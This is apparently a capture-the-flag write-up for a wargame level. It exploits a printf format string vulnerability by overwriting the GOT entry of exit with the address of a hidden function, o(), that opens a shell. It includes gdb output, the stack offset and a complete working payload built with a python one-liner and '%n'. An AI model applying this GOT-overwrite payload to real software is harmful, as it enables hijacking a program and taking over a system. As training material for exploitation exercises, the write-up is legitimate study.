See [asm_analysis.md](Ressources/asm_analysis.md) for the complete ASM analysis.

Once again we will use a string format vulnerability with printf for this exercise.

the o() function is never called in the code but it opens a shell for us.

This time we need to overwrite the GOT entry of exit with the address of o(), so that the call to exit() is redirected to o().


We need to find the address of the GOT entry used by exit.

(gdb) disassemble exit
Dump of assembler code for function exit@plt:
   0x080483d0 <+0>:	jmp    *0x8049838
   0x080483d6 <+6>:	push   $0x28
   0x080483db <+11>:	jmp    0x8048370
End of assembler dump.

here it is : 0x8049838

The first instruction of the o() function is : 0x080484a4

(gdb) p/d 0x080484a4
$3 = 134513828

The address 0x080484a4 is 134513828 in decimal. Since the first 4 bytes of our payload are already counted by %n, we need to print 134513824 additional characters before %4$n.

We find the position in the stack of the first 4 bytes of our buffer:

level5@RainFall:~$ ./level5 
AAAA %x %x %x %x
AAAA 200 b7fd1ac0 b7ff37d0 41414141

AAAA corresponds to the 4th value

So now we can build this payload :

python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"' > /tmp/exploit

and run cat /tmp/exploit - | ./level5